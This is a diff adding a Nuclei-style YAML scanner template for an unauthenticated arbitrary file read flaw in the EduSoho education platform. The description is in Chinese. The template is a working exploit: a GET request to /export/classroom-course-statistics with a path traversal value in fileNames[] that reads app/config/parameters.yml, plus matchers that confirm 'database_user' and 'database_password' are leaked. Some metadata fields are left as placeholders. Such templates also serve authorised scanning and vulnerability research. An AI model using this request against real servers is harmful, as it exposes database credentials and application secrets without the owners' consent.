@@ -1,0 +1,26 @@
+id: edusoho-statistics-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。EduSoho教培系统classropm-course-statistics存在任意文件读取漏洞，未授权的攻击者可通过该漏洞读取敏感文件如app/config/parameters.yml，获取系统数据库账号密码，应用密钥等敏感信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/EduSoho%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9Fclassropm-course-statistics%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml"
+
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'database_user'
+      - type: word
+        part: body
+        words:
+          - 'database_password'
